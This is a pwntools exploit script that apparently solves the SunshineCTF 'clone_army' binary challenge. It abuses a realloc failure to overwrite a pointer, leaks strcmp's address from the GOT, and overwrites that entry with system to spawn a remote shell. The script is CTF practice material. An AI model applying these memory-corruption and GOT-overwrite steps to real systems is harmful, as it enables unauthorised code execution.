from pwn import *

chal = ELF('./clone_army_patched')
libc = ELF('./clone_army-libc.so')

HOST = 'chal.sunshinectf.games'
PORT =  25001

gdbscript='''
b *make_clones + 232
b *customize_troops + 331
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

if args.GDB:
    conn = gdb.debug([chal.path], gdbscript)
elif args.REMOTE:
    conn = remote(HOST, PORT)
else:
    conn = process([chal.path])

def as_f(val):
    return struct.unpack('<f', struct.pack('<i', val))[0]

def main():
    addr_clone_army = 0x403a90
    conn.sendlineafter(b'> ', b'yes')
    conn.sendlineafter(b'> ',b'0') # upper 4 bytes of `clone_army`
    conn.sendlineafter(b'> ', str(as_f(1) / 0.4536).encode()) # `clone_army_count`
    conn.sendlineafter(b'> ', b'0')

    # Set `clone_army_count` to `addr_clone_army >> 4` in order to overwrite `clone_army` later.
    conn.sendlineafter(b'> ', b'yes')
    conn.sendlineafter(b'> ', str(addr_clone_army >> 4).encode())

    # Force `realloc` to return `NULL`, overwrite `clone_army`, and change `clone_army_count` to exit the loop.
    conn.sendlineafter(b'> ', b'yes')
    overflow = (1<<31) - 1
    conn.sendlineafter(b'> ', str(overflow).encode())

    conn.sendlineafter(b'> ', b'no')

    # Overwrite `clone_army` with `addr_got_strcmp`.
    conn.sendlineafter(b'> ', b'yes')
    addr_got_strcmp = 0x4039e8
    conn.sendlineafter(b'> ', b'0')
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'> ', str(addr_got_strcmp).encode())
    conn.sendlineafter(b'> ', b'yes')
    
    # From `addr_got_strcmp`, leak the lower 4 bytes of `strcmp`'s address, 
    # compute the lower 4 bytes of system, then perform GOT overwrite to call `system("/bin/sh")`.
    conn.sendlineafter(b'> ', b'yes')
    conn.sendlineafter(b'> ', b'0')
    conn.recvuntil(b'#')
    addr_system_lower_4 = int(conn.recvuntil(b'\'', drop=True), 10) - 0x132850
    info(f'{addr_system_lower_4 = :#x}')
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'> ', str(addr_system_lower_4).encode())
    conn.sendlineafter(b'> ', b'/bin/sh')
    conn.interactive()

if __name__ == '__main__':
    main()